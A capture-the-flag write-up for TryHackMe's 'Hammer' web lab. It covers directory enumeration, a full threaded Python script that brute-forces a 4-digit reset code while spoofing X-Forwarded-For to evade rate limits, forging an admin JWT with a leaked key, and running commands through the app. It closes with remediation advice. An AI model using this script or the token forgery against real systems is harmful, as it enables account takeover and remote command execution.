# THM-HAMMER
Web application security CTF from TryHackMe’s “Hammer.”
Demonstrating authentication bypass, session manipulation, JWT privilege escalation, and remote command execution 

Category: Web Application Security / Authentication / JWT Tokens

Author: Slade Venter

# Scenario
The objective was to assess authentication controls, session behaviour, and privilege boundaries from an unauthenticated attacker perspective. The engagement was approached methodically, analysing password reset logic, token handling, and backend command execution mechanisms.


# Environment 
| Component | Details                                                                            |
| --------- | ---------------------------------------------------------------------------------- |
| Platform  | TryHackMe “Hammer” room                                                            |
| Tools     |Nmap, Feroxbuster, Burp Suite, JWT.io, Modified Python Script                       |
| Services  | SSH (22), PHP Web Server (1337)                                                    |
| Goal      | Identify authentication weaknesses and escalate privileges                         |



# Initial Reconnaissance
An Nmap scan revealed two open ports:
  - SSH on port `[22]`
  - PHP web server on port `[1337]`

**nmap -sC -sV -p- `<http:hammer.thm>`**

![Nmap Scan](screenshots/nmapresults.png) 

# Directory Enumeration & Password Reset Analysis
Using Feroxbuster, directory enumeration was performed against the web server. Modified dirb wordlists were used. 


**feroxbuster -u `http://hammer.thm:1337` -w /usr/share/wordlists/dirb/big.txt**

![Directory Enumeration](screenshots/ferric_oxide_output.png)

HMR confirmed in the page source
![HMR Source](screenshots/hmrsource.png)

Some directories discovered are HMR directories these Hot Module Replacements are different to search for in the wordlists. This HMR discovery allows use to modify the dirb wordlist in a separate directory to the scan specifically for HMR's. 

![Wordlist Edit](screenshots/sed.png)

An error directory was discovered that showed evidence of previous password reset attempts. Under `tester@hammer.thm` This revealed the existence of a password recovery mechanism for the PHP.

Error Directory found

![Error Directory](screenshots/errorlogs.png)

Error Logs in the directory

![Error Log Found](screenshots/errorlog2.png)

There are other directories to note from FO's output. Such as the adminphp page, but these are all smoke and mirrors.

# Exploiting the Password Reset Workflow

We are greeted with a login page, I tried to enter the obvious passwords and usernames but got nothing.

![Login Page](screenshots/Login.png)

You can explore around and map the site. Eventually you'll come across the PHPSESSID.
It all boils down to finding a way to brute force the password recovery. The mechanism works by first requesting a password reset and retrieving the PHPSESSID, then submit the recovery code in a brute-force manner while refreshing the PHPSESSID till you get the correct recovery code.

The password reset functionality relied on:
  - PHPSESSID
  - Recovery code
  - 180-second validity window

Using Burp Suite, the reset link was intercepted and analysed. The recovery code validation logic could be brute forced while refreshing the PHPSESSID within the timeout window.

![Login Page](screenshots/PHPSESSID.png)

To achieve our goals it’s time for some scripting.
A modified brute force script was used to automate the process. There are MANY scripts out there that can get the job done for this exact problem. 
I found a really good one authored By TheSysRAT. I then edited further for what I wanted to do added some other import sections and what it render. You can write you own if you would like but PLEASE at the very least understand what the script does. 


### Preview Snippet
```python
# detect success by looking for the absence of the failure message
if "Invalid or expired recovery code!" not in response.text:
    found_flag.set()
    correct_code = recovery_code
```
<details>
  <summary><strong>Click to expand full script</strong></summary>

  <pre><code class="language-python">
import requests
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from rich.prompt import Prompt
from rich.progress import Progress
import threading

# Initialize the Rich console for fancy output
console = Console()

# Ask user for configuration
TARGET_IP = Prompt.ask("[bold green]Enter the target IP address[/]")
TARGET_PORT = Prompt.ask("[bold green]Enter the target port[/]", default="1337")
SESSION_COOKIE = Prompt.ask("[bold green]Enter your PHPSESSID cookie[/]")

# URL for password reset form
RESET_PASSWORD_URL = f"http://{TARGET_IP}:{TARGET_PORT}/reset_password.php"

# Flag to stop all threads when correct code is found
found_flag = threading.Event()
correct_code = None

def get_headers_with_random_ip():
    """Returns headers with a random X-Forwarded-For IP."""
    random_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    return {
        "Host": f"{TARGET_IP}:{TARGET_PORT}",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": f"http://{TARGET_IP}:{TARGET_PORT}",
        "DNT": "1",
        "Connection": "keep-alive",
        "Referer": f"http://{TARGET_IP}:{TARGET_PORT}/reset_password.php",
        "Upgrade-Insecure-Requests": "1",
        "Cookie": f"PHPSESSID={SESSION_COOKIE}",
        "X-Forwarded-For": random_ip
    }

def try_recovery_code(recovery_code):
    """
    Attempts a single recovery code.
    
    Args:
        recovery_code (str): The recovery code to try.
    
    Returns:
        tuple: (success: bool, recovery_code: str)
    """
    global correct_code
    
    # Check if another thread already found the code
    if found_flag.is_set():
        return (False, recovery_code)
    
    # Prepare headers with random IP
    headers = get_headers_with_random_ip()
    
    # Data payload for the POST request
    data_payload = {
        "recovery_code": recovery_code,
        "s": "180"
    }

    try:
        # Send the POST request
        response = requests.post(
            RESET_PASSWORD_URL,
            headers=headers,
            data=data_payload,
            timeout=5
        )
        
        # Check if the response indicates success
        if "Invalid or expired recovery code!" not in response.text:
            found_flag.set()
            correct_code = recovery_code
            return (True, recovery_code)
        
        return (False, recovery_code)
        
    except requests.RequestException:
        return (False, recovery_code)

def brute_force_recovery_code():
    """Brute-forces the recovery code using multiple threads."""
    global correct_code
    
    console.print(f"[bold blue]Starting brute-force attack...[/]")
    console.print(f"[bold yellow]Target: {RESET_PASSWORD_URL}[/]\n")
    
    # Generate all possible 4-digit codes
    all_codes = [f"{code:04d}" for code in range(10000)]
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        with Progress(console=console) as progress:
            task = progress.add_task("[cyan]Brute-forcing recovery codes...", total=len(all_codes))
            
            # Submit all tasks
            futures = {executor.submit(try_recovery_code, code): code for code in all_codes}
            
            # Process completed futures
            for future in as_completed(futures):
                if found_flag.is_set():
                    for f in futures:
                        f.cancel()
                    break
                
                try:
                    success, code = future.result()
                    
                    if success:
                        console.print(f"\n[bold green]SUCCESS! The correct recovery code is: {code}[/]")
                        break
                    
                except Exception:
                    pass
                
                progress.update(task, advance=1)
    
    if correct_code:
        console.print(f"\n[bold green]═══════════════════════════════════════[/]")
        console.print(f"[bold green]  RECOVERY CODE: {correct_code}[/]")
        console.print(f"[bold green]═══════════════════════════════════════[/]")
    else:
        console.print("\n[bold red]No valid recovery code found in range 0000-9999[/]")

if __name__ == "__main__":
    console.print("""
[bold magenta]╔═══════════════════════════════════════════╗
║  Recovery Code Brute Force Tool          ║
║  For Authorized CTF Testing Only          ║
╚═══════════════════════════════════════════╝[/]
    """)
    brute_force_recovery_code()
  </code></pre>
</details>

*Can view the uploaded file here*

[View Script](BRUTETHIS.py)

Once run it produced a security code that was then used to gain access to the password reset function for `test@hammer.thm`

![Security Code](screenshots/BRUTETHIS.png)

A reset password window will be displayed and feel free to use whatever password you want, but I suggest making it short 1234, qwerty etc. You will be typing it in a lot if you're exploring the page.

![Reset Password](screenshots/new_password.png)

Go ahead and login with your new credentials and BOOM there is our first flag right on the top there.

![Flag 1](screenshots/flag1.png)

# Command Transmission, AJAX & JWT

It’s at this point where the app starts to log you out after a short time. Inspecting the page source reveals a couple of things here. 

![Persistent Session](screenshots/Peristentsessioncookie.png)

The `persistentSession` parameter influenced session lifetime. Modifying the cookie expiry is the next step, we can set this using tools but I just continued the investigation using burpsuite after adjusting the cookies expiry in the browsers tools. This is a lazy way to do things but it works and keeps us logged in.

![Cookie Expiry](screenshots/Cookieexpiry.png)

A submitCommand function was identified which sent an AJAX request to the server containing user-supplied input. The request included a JWT token and resulted in backend command execution.
This behaviour represents command transmission, where client input is passed to the server and interpreted as system-level instructions. This is security sensitive because insufficient validation can allow attackers to execute arbitrary commands on the host.

That means we have possible RCE (Remote Code Execution).

![RCE Maybe?](screenshots/RCEmaybe.png)

After typing random commands and capturing them using burpsuite the `"ls"` command seems to be the only that brings up anything in the command box. It brings up some interesting directories, so now we have to try to access them. So let’s go ahead and capture that command being sent using BurpSuite and see what we have.

# JWT Analysis & Privilege Escalation

![Working Command Capture](screenshots/BurpsuiteLS.png)

Keep that capture and send it to the repeater, going to use this later.

Heading to that directory leads you to `.key` file that can be downloaded, this file when read contains a secret key.

<sub>Please be cautious when downloading anything, even from THM.</sub>

![Secret Key](screenshots/extractedkey1.png)

We are going to assume that with the JWT token found in the source code AND a random key found that can only fit a handful of circumstances, we are going to have to manipulate those JWT tokens.
Heading back to the BurpSuite capture of the `"ls"` command. I used jwt.io and supertokens to creat the tokens.

The JWT token when input into jwt.io shows the `kid` parameter referenced a local file path rather than a safe key identifier. This key identifier is the key found earlier. Since this is a web application html will also have to be input into the token. 
I used supertokens to edit this part of token, adjusting the role to admin and the rest of the token with the key. I then used jwt.io to input the secret key `[56058354efb3daa97ebab00fabd7a7d7]` and validate the token.

![Validated Token](screenshots/Validsecret1.png)

The token was then added in the repeater in the `Authorization: Bearer` header and forward the token to the page.

![ID Command Working](screenshots/ID_Auth.png)

# Remote Code Execution Confirmation

After confirming the code execution works, the flag was retreived with escalated privilges.
`cat /home/ubuntu/flag.txt`

![Captured Flag](screenshots/FLAG.png)

Success! That’s Hammer done!

# Conclusion
The Hammer application demonstrates how multiple small trust issues can combine into full system compromise. The password reset process allowed repeated attempts within a limited window while the session identifier could be refreshed, turning a recovery feature into an authentication bypass. After login, session validity depended on client-side cookie state rather than server tracking, allowing the session to persist beyond its intended lifetime.
Further analysis revealed a command interface authorised by a JWT token whose kid header referenced a local file path. This exposed the signing secret, allowing a forged token with elevated privileges. The application accepted the modified token and executed supplied commands, resulting in remote code execution. The compromise occurred not through a software exploit but through misplaced trust in client controlled data across authentication, session management, and authorisation logic.

# Remediation

<sub>This section is dedicated helping people interested in offensive security learn one step further that seems to be missed in a lot of education and is so critical in landing good roles, remediation!<sub>

Password Reset Mechanism | High Risk (CVSS ~ 8.1)

The reset process should generate a long cryptographically secure token stored server side and linked to a single reset request. The server must track attempt counts and invalidate the token after a small number of failures or immediately after successful use. Reset attempts must not be reusable by refreshing a session, and the verification logic should not depend on timing windows alone. Rate limiting and per-account lockout should be enforced to prevent brute forcing.

Session Management | Medium Risk (CVSS ~ 6.5)

Session validity must be determined entirely by the server. Each session identifier should correspond to a server record containing creation time and expiry time. The server must reject expired sessions regardless of browser cookie lifetime. Client-side expiry should only affect browser behaviour and not authentication acceptance.

JWT Authorisation | Critical Risk (CVSS ~ 9.8)

The kid field should reference only keys from a predefined server keystore and never a file path. Signing secrets must not be retrievable through application functionality. The server should validate expected claims such as role and issuer and not trust any value simply because the token signature is valid.

Command Execution | Critical Risk (CVSS ~ 10.0)

Web requests should not directly execute system commands. Administrative actions should call controlled application functions, and user input must never be interpreted as operating system instructions. Restrict execution context and apply least privilege principles to prevent host compromise.


I try treat these types of rooms as client engagements rather than simple CTFs. I hope you enjoyed and I hope it helped you.

<sub>Make sure you look at your key file as time goes on THM will change the secrets file as tokens expire.<sub>
